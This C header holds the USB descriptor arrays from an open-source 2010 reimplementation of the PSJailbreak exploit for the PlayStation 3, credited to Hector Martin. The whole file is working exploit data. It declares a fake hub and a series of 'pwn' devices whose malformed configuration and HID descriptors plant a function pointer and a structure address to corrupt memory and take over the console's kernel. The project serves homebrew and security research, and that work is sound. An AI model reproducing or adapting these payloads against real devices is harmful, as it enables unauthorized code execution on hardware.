/*  descriptors.h - USB descriptors implementing the PSJailbreak exploit

Copyright (C) 2010  Hector Martin "marcan" <hector@marcansoft.com>

This code is licensed to you under the terms of the GNU GPL, version 2;
see file COPYING or http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt
*/

#ifndef DESCRIPTORS_H
#define DESCRIPTORS_H

#define U16(x) ((x)&0xff),((x)>>8)

u8 hub_dev[] = {
	0x12, DEVICE,		// size, type
	U16(0x200),			// usb ver
	0x09, 0x00, 0x01,	// class, sub, proto
	EP0_PKTSIZE,		// max ep0 size
	U16(0xAAAA),		// vendor
	U16(0xCCCC),		// product
	U16(0x0100),		// device rev
	0, 0, 0,			// strings
	1					// num configs
};

u8 hub_cfg[] = {
	0x09, CONFIGURATION,	// size, type
	U16(0x19),				// total length
	1,						// num interfaces
	1,						// config value
	0,						// string
	0xe0,					// attributes
	50,						// max power

	0x09, INTERFACE,		// size, type
	0,						// interface number
	0,						// alternate setting
	1,						// num endpoints
	9,0,0,					// class, sub, proto
	0,						// string

	0x07, ENDPOINT,			// size, type
	0x81,					// address
	0x03,					// attributes = interrupt
	U16(1),					// max packet size
	12,						// interval
};

u8 hub_hub[] = {
	0x09, HUB,		// size, type
	6,				// num ports
	U16(0x00a9),	// attribs = lots of lies
	50,				// pwron to pwrgood
	100,			// max hub current (epic fail vs. above)
	0x00,			// none removable
	0xff,			// pwrctrlmask
};

u8 pwn1_dev[] = {
	0x12, DEVICE,		// size, type
	U16(0x200),			// usb ver
	0x00, 0x00, 0x00,	// class, sub, proto
	EP0_PKTSIZE,		// max ep0 size
	U16(0xAAAA),		// vendor
	U16(0x5555),		// product
	U16(0x0000),		// device rev
	0, 0, 0,			// strings
	4					// num configs
};

u8 pwn1_cfg[] = {
	0x09, CONFIGURATION,	// size, type
	U16(0xf00),				// total length
	1,						// num interfaces
	0,						// config value
	0,						// string
	0x80,					// attributes
	250,					// max power

	0x09, INTERFACE,		// size, type
	0,						// interface number
	0,						// alternate setting
	0,						// num endpoints
	0xfe,1,2,				// class, sub, proto
	0,						// string

	// padding
	0, 0, 0, 0, 0, 0,

	// function pointer
	0x80, 0x00, 0x00, 0x00, 0x00, 0x4d, 0x10, 0x20,
	// function descriptor
	// evil Lv-2 ignores the TOC entries, so we don't include it
	0x80, 0x00, 0x00, 0x00, 0x00, 0x4d, 0x10, 0x28,
};

u8 pwn2_dev[] = {
	0x12, DEVICE,		// size, type
	U16(0x200),			// usb ver
	0x00, 0x00, 0x00,	// class, sub, proto
	EP0_PKTSIZE,		// max ep0 size
	U16(0xAAAA),		// vendor
	U16(0xBBBB),		// product
	U16(0x0000),		// device rev
	0, 0, 0,			// strings
	1					// num configs
};

u8 pwn2_cfg[] = {
	0x09, CONFIGURATION,	// size, type
	U16(0x16),				// total length
	1,						// num interfaces
	1,						// config value
	0,						// string
	0x80,					// attributes
	1,						// max power

	0x09, INTERFACE,		// size, type
	0,						// interface number
	0,						// alternate setting
	0,						// num endpoints
	0xfe,1,2,					// class, sub, proto
	0,						// string

	0x04, HID,				// size, type
	0xb4, 0x2f				// ????
};

u8 pwn3_dev[] = {
	0x12, DEVICE,		// size, type
	U16(0x200),			// usb ver
	0x00, 0x00, 0x00,	// class, sub, proto
	EP0_PKTSIZE,		// max ep0 size
	U16(0xAAAA),		// vendor
	U16(0x5555),		// product
	U16(0x0000),		// device rev
	0, 0, 0,			// strings
	2					// num configs
};

u8 pwn3_cfg[] = {
	0x09, CONFIGURATION,	// size, type
	U16(0xa4d),				// total length
	1,						// num interfaces
	1,						// config value
	0,						// string
	0x80,					// attributes
	1,						// max power
};

u8 pwn3_padding[] = {
	0x09, INTERFACE,		// size, type
	0,						// interface number
	0,						// alternate setting
	0,						// num endpoints
	0xfe,1,2,					// class, sub, proto
	0,						// string
};

u8 pwn4_dev[] = {
	0x12, DEVICE,		// size, type
	U16(0x200),			// usb ver
	0x00, 0x00, 0x00,	// class, sub, proto
	EP0_PKTSIZE,		// max ep0 size
	U16(0xAAAA),		// vendor
	U16(0x5555),		// product
	U16(0x0000),		// device rev
	0, 0, 0,			// strings
	3					// num configs
};

u8 pwn4_cfg1[] = {
	0x09, CONFIGURATION,	// size, type
	U16(0x12),				// total length
	1,						// num interfaces
	1,						// config value
	0,						// string
	0x80,					// attributes
	1,						// max power

	0x09, INTERFACE,		// size, type
	0,						// interface number
	0,						// alternate setting
	0,						// num endpoints
	0xfe,1,2,					// class, sub, proto
	0,						// string
};

u8 pwn4_cfg2[] = {
	0x09, CONFIGURATION,	// size, type
	U16(0x12),				// total length
	1,						// num interfaces
	1,						// config value
	0,						// string
	0x80,					// attributes
	1,						// max power

	0x09, INTERFACE,		// size, type
	0,						// interface number
	0,						// alternate setting
	0,						// num endpoints
	0xfe,1,2,					// class, sub, proto
	0,						// string
};

u8 pwn4_cfg3[] = {
	0x09, CONFIGURATION,	// size, type
	U16(0x30),				// total length
	1,						// num interfaces
	1,						// config value
	0,						// string
	0x80,					// attributes
	1,						// max power

	0x09, INTERFACE,		// size, type
	0,						// interface number
	0,						// alternate setting
	0,						// num endpoints
	0xfe,1,2,					// class, sub, proto
	0,						// string

	0x3e, HID,				// size, type (size is inconsistent)

	// padding
	0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,

	// address of structure within pwn1 descriptor
	// sets up the exploit
	0x80, 0x00, 0x00, 0x00, 0x00, 0x4d, 0x10, 0x18
};

u8 final_dev[] = {
	0x12, DEVICE,		// size, type
	U16(0x200),			// usb ver
	0x00, 0x00, 0x00,	// class, sub, proto
	EP0_PKTSIZE,		// max ep0 size
	U16(0xAAAA),		// vendor
	U16(0x3713),		// product
	U16(0x0000),		// device rev
	0, 0, 0,			// strings
	1					// num configs
};

u8 final_cfg[] = {
	0x09, CONFIGURATION,	// size, type
	U16(0x12),				// total length
	1,						// num interfaces
	1,						// config value
	0,						// string
	0x80,					// attributes
	1,						// max power

	0x09, INTERFACE,		// size, type
	0,						// interface number
	0,						// alternate setting
	0,						// num endpoints
	0xfe,1,2,				// class, sub, proto
	0,						// string
};

#endif